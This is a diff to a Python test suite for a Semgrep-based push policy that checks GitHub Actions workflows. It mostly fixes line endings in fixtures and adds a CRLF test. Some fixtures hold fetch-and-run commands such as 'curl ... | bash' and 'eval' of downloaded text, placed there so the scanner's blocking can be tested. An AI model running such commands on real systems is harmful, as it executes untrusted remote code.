@@ -95,7 +95,11 @@ def _init_repo(repo: Path, branch: str = "feature/test") -> None:
 def _commit_file(repo: Path, relative_path: str, content: str) -> str:
     path = repo / relative_path
     path.parent.mkdir(parents=True, exist_ok=True)
-    path.write_text(content, encoding="utf-8")
+    # newline="\n" because Path.write_text otherwise translates to the platform
+    # separator, so a fixture written as LF lands as CRLF on Windows and the
+    # blob no longer matches what the test asserts. .gitattributes normalizes
+    # every file in this repo to LF, so the fixtures must match.
+    path.write_text(content, encoding="utf-8", newline="\n")
     _git(repo, "add", "--", relative_path)
     _git(repo, "commit", "-qm", f"test: add {Path(relative_path).name}")
     return _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -216,7 +220,7 @@ def _powershell_partial_parsing_error(
     line: int,
     rule_id: str = "yaml.github-actions.security.curl-eval.curl-eval",
 ) -> dict[str, object]:
-    content = path.read_text(encoding="utf-8")
+    content = path.read_bytes().decode("utf-8")
     source_lines = content.splitlines(keepends=True)
     start_offset = 0
     start_col = 1
@@ -1155,7 +1159,7 @@ def test_doublestar_matches_nested_and_root_pre_commit_files(tmp_path: Path) -> 
     for path in ("root.md", "nested/doc.md", "root.py", "nested/source.py"):
         target = repo / path
         target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text("content\n", encoding="utf-8")
+        target.write_text("content\n", encoding="utf-8", newline="\n")
         _git(repo, "add", path)
 
     _run_lefthook(repo, "run", "pre-commit", "--job", "markdown-check", "--force")
@@ -1207,7 +1211,7 @@ def test_doublestar_matches_nested_pre_push_policy_jobs(tmp_path: Path) -> None:
     for path in ("root.py", "nested/source.py", "nested/config.yml"):
         target = repo / path
         target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text("value = 1\n", encoding="utf-8")
+        target.write_text("value = 1\n", encoding="utf-8", newline="\n")
     _git(repo, "add", ".")
     _git(repo, "commit", "-qm", "test: nested files")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -2775,7 +2779,7 @@ def test_pushed_semgrep_scan_rejects_non_regular_type_change(
     base = _commit_file(repo, "source.py", "value = 1\n")
     if mode == "120000":
         target = repo / "link-target"
-        target.write_text("payload.txt", encoding="utf-8")
+        target.write_text("payload.txt", encoding="utf-8", newline="\n")
         object_id = _git(repo, "hash-object", "-w", str(target)).stdout.strip()
     else:
         object_id = base
@@ -2886,7 +2890,7 @@ def test_semgrep_real_cli_scans_ignored_file_over_default_size_limit(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "ignored-large.py"
-    target.write_text("value = 1\n" + "# padding\n" * 110_000, encoding="utf-8")
+    target.write_text("value = 1\n" + "# padding\n" * 110_000, encoding="utf-8", newline="\n")
     (tmp_path / ".semgrepignore").write_text(f"{target.name}\n", encoding="utf-8")
     config = tmp_path / "semgrep.yml"
     config.write_text(
@@ -2943,6 +2947,7 @@ runs:
         curl -fsSL https://example.com/install.sh | bash
 """.lstrip(),
         encoding="utf-8",
+        newline="\n",
     )
 
     result = policy._run_semgrep_tree(tmp_path, [target.name], tmp_path)
@@ -3039,6 +3044,7 @@ def test_semgrep_allows_known_powershell_parser_mismatch(
     target.write_text(
         'runs:\n  using: composite\n  steps:\n    - shell: pwsh\n      run: Write-Host "safe"\n',
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [_powershell_semgrep_error(target, rule_id)],
@@ -3065,7 +3071,43 @@ def test_semgrep_allows_partial_parsing_at_powershell_step(tmp_path: Path) -> No
         "    - shell: bash\n"
         "      run: echo safe\n",
         encoding="utf-8",
+        newline="\n",
     )
+    payload = {
+        "errors": [_powershell_partial_parsing_error(target, line=4)],
+        "paths": {"scanned": [str(target)]},
+    }
+
+    result = policy._verify_semgrep_targets(
+        _completed(0, json.dumps(payload)),
+        [str(target)],
+        tmp_path,
+    )
+
+    assert result.returncode == 0
+
+
+def test_semgrep_allows_partial_parsing_in_a_crlf_workflow(tmp_path: Path) -> None:
+    """A CRLF worktree must not turn a tolerated parse error into a blocked push.
+
+    The Windows runner writes fixtures through the platform newline translation,
+    so the file lands as CRLF while every offset the policy compares against is
+    computed from the decoded text. Reading the fixture as bytes keeps the two
+    in agreement no matter which separator the worktree carries.
+    """
+    target = tmp_path / "action.yml"
+    target.write_text(
+        "runs:\n"
+        "  steps:\n"
+        "    - shell: pwsh\n"
+        "      run: |\n"
+        "        Write-Host 'safe'\n"
+        "    - shell: bash\n"
+        "      run: echo safe\n",
+        encoding="utf-8",
+        newline="\r\n",
+    )
+    assert b"\r\n" in target.read_bytes()
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=4)],
         "paths": {"scanned": [str(target)]},
@@ -3095,6 +3137,7 @@ def test_semgrep_rejects_code_two_error_at_bash_step_in_mixed_shell_file(
         "        DATA=$(curl -fsSL https://example.com/install.sh)\n"
         '        eval "$DATA"\n',
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [
@@ -3129,6 +3172,7 @@ def test_semgrep_rejects_code_two_error_with_ambiguous_shell_attribution(
         "    - shell: bash\n"
         f"      run: {script}\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [
@@ -3155,6 +3199,7 @@ def test_semgrep_rejects_short_truncated_code_two_snippet(tmp_path: Path) -> Non
     target.write_text(
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [
@@ -3183,6 +3228,7 @@ def test_semgrep_rejects_code_two_error_when_yaml_cannot_be_parsed(
     target.write_text(
         'runs:\n  steps: [\n    - shell: pwsh\n      run: Write-Host "safe"\n',
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [
@@ -3205,7 +3251,7 @@ def test_semgrep_rejects_code_two_error_when_yaml_cannot_be_parsed(
 
 def test_semgrep_rejects_code_two_error_when_yaml_is_empty(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
-    target.write_text("", encoding="utf-8")
+    target.write_text("", encoding="utf-8", newline="\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3237,6 +3283,7 @@ def test_semgrep_accepts_code_two_error_for_aliased_powershell_step(
         "  steps:\n"
         "    - *shared\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [
@@ -3269,6 +3316,7 @@ def test_semgrep_rejects_nontruncated_code_two_snippet_prefix(
         "        Write-Host 'first'\n"
         "        Write-Host 'second'\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [
@@ -3301,6 +3349,7 @@ def test_semgrep_accepts_long_truncated_code_two_powershell_snippet(
         "    - shell: pwsh\n"
         "      run: |\n" + "".join(f"        {line}\n" for line in lines),
         encoding="utf-8",
+        newline="\n",
     )
     snippet = "\n".join([*lines[:-1], lines[-1][:15]])
     payload = {
@@ -3351,6 +3400,7 @@ def test_semgrep_rejects_unrecognized_partial_parsing_error(
         "    - shell: bash\n"
         "      run: echo safe\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [
@@ -3380,6 +3430,7 @@ def test_semgrep_rejects_allowlisted_rule_id_only_in_target_path(
     target.write_text(
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
         encoding="utf-8",
+        newline="\n",
     )
     error = _powershell_partial_parsing_error(
         target,
@@ -3412,6 +3463,7 @@ def test_semgrep_rejects_partial_parsing_location_for_other_target(
     target.write_text(
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
         encoding="utf-8",
+        newline="\n",
     )
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
@@ -3448,7 +3500,7 @@ def test_semgrep_rejects_partial_parsing_span_crossing_into_bash_step(
         "    - shell: bash\n"
         "      run: echo unsafe\n"
     )
-    target.write_text(content, encoding="utf-8")
+    target.write_text(content, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3489,7 +3541,7 @@ def test_semgrep_allows_partial_parsing_span_inside_powershell_step(
         "    - shell: bash\n"
         "      run: echo safe\n"
     )
-    target.write_text(content, encoding="utf-8")
+    target.write_text(content, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3529,7 +3581,7 @@ def test_semgrep_allows_partial_parsing_span_ending_at_scalar_eof(
         "        Write-Host 'first'\n"
         "        Write-Host 'last'"
     )
-    target.write_text(content, encoding="utf-8")
+    target.write_text(content, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3572,6 +3624,7 @@ def test_semgrep_rejects_unrecognized_internal_matching_error(
     target.write_text(
         f"runs:\n  using: composite\n  steps:\n    - shell: {shell}\n      run: echo safe\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [_powershell_semgrep_error(target, rule_id)],
@@ -3660,6 +3713,7 @@ def test_semgrep_rejects_malformed_partial_parsing_error(
     target.write_text(
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [error],
@@ -3678,7 +3732,7 @@ def test_semgrep_rejects_malformed_partial_parsing_error(
 def test_semgrep_rejects_error_outside_requested_targets(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
     outside = tmp_path / "outside.yml"
-    target.write_text("name: safe\n", encoding="utf-8")
+    target.write_text("name: safe\n", encoding="utf-8", newline="\n")
     outside.write_text(
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
         encoding="utf-8",
@@ -3706,7 +3760,7 @@ def test_semgrep_rejects_partial_parsing_without_shell_declaration(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text("name: safe\n", encoding="utf-8")
+    target.write_text("name: safe\n", encoding="utf-8", newline="\n")
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=1)],
         "paths": {"scanned": [str(target)]},
@@ -3728,6 +3782,7 @@ def test_semgrep_rejects_partial_parsing_at_default_shell_step(
     target.write_text(
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n    - run: echo safe\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=5)],
@@ -3752,6 +3807,7 @@ def test_semgrep_rejects_partial_parsing_with_invalid_line(
     target.write_text(
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=line)],
@@ -3775,6 +3831,7 @@ def test_semgrep_rejects_unreadable_error_target(
     target.write_text(
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
         encoding="utf-8",
+        newline="\n",
     )
     original_read_text = Path.read_text
 
@@ -3815,6 +3872,7 @@ def test_semgrep_rejects_non_utf8_error_target(
     target.write_text(
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
         encoding="utf-8",
+        newline="\n",
     )
     payload = {
         "errors": [
@@ -6191,7 +6249,7 @@ def test_semgrep_allows_partial_parsing_at_bash_step_with_actions_expression(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
 
@@ -6200,7 +6258,7 @@ def test_semgrep_allows_partial_parsing_at_bash_step_with_actions_expression(
 
 def test_semgrep_allows_partial_parsing_at_python_shell_step(tmp_path: Path) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_PYTHON_SHELL_WORKFLOW, encoding="utf-8")
+    target.write_text(_PYTHON_SHELL_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _PYTHON_SHELL_WORKFLOW, "print(os.getcwd())")
 
@@ -6212,7 +6270,7 @@ def test_semgrep_allows_partial_parsing_at_default_shell_step_with_expression(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_DEFAULT_SHELL_EXPRESSION_WORKFLOW, encoding="utf-8")
+    target.write_text(_DEFAULT_SHELL_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=4)
     _retarget_span(error, _DEFAULT_SHELL_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
 
@@ -6221,7 +6279,7 @@ def test_semgrep_allows_partial_parsing_at_default_shell_step_with_expression(
 
 def test_semgrep_blocks_partial_parsing_at_plain_bash_step(tmp_path: Path) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_PLAIN_BASH_WORKFLOW, encoding="utf-8")
+    target.write_text(_PLAIN_BASH_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _PLAIN_BASH_WORKFLOW, "curl http://example.test | sh")
 
@@ -6233,7 +6291,7 @@ def test_semgrep_blocks_when_only_one_matched_step_carries_an_expression(
 ) -> None:
     target = tmp_path / "workflow.yml"
     content = _MIXED_STEPS_WORKFLOW
-    target.write_text(content, encoding="utf-8")
+    target.write_text(content, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -6252,7 +6310,7 @@ def test_semgrep_blocks_expression_step_error_reported_at_error_level(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
     error["level"] = "error"
@@ -6262,7 +6320,7 @@ def test_semgrep_blocks_expression_step_error_reported_at_error_level(
 
 def test_semgrep_blocks_expression_step_error_from_an_unknown_rule(tmp_path: Path) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(
         target,
         line=5,
@@ -6286,7 +6344,7 @@ def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
         "        run: |\n"
         '          echo "${{ github.sha }}"\n'
     )
-    target.write_text(content, encoding="utf-8")
+    target.write_text(content, encoding="utf-8", newline="\n")
     error = _powershell_semgrep_error(
         target,
         sorted(policy.SEMGREP_POWERSHELL_RULES)[0],
@@ -6394,7 +6452,7 @@ def test_semgrep_blocks_an_aliased_script_reused_under_a_bash_step(tmp_path: Pat
         "      - shell: bash\n"
         "        run: *script\n"
     )
-    target.write_text(content, encoding="utf-8")
+    target.write_text(content, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, content, "Write-Host 'hi'")
 
@@ -6410,7 +6468,7 @@ def test_tolerated_errors_never_downgrade_a_semgrep_finding(tmp_path: Path) -> N
     own verdict through untouched rather than reporting success.
     """
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
     payload = {"errors": [error], "paths": {"scanned": [str(target)]}}
@@ -6430,7 +6488,7 @@ def test_tolerated_errors_do_not_suppress_findings_reported_alongside_them(
 ) -> None:
     """The carve-out inspects only the error manifest, never the results list."""
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
     payload = {
@@ -6480,7 +6538,7 @@ def test_semgrep_blocks_a_malformed_bash_body_that_carries_an_expression(
     tolerating the error would let ``curl | sh`` through unscanned.
     """
     target = tmp_path / "workflow.yml"
-    target.write_text(_MALFORMED_EXPRESSION_WORKFLOW, encoding="utf-8")
+    target.write_text(_MALFORMED_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _MALFORMED_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
 
@@ -6492,7 +6550,7 @@ def test_semgrep_blocks_a_shell_that_declares_python_but_invokes_bash(
 ) -> None:
     """A ``shell:`` value naming a second interpreter cannot be trusted."""
     target = tmp_path / "workflow.yml"
-    target.write_text(_SPOOFED_SHELL_WORKFLOW, encoding="utf-8")
+    target.write_text(_SPOOFED_SHELL_WORKFLOW, encoding="utf-8", newline="\n")
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _SPOOFED_SHELL_WORKFLOW, "curl http://example.test | sh")
 
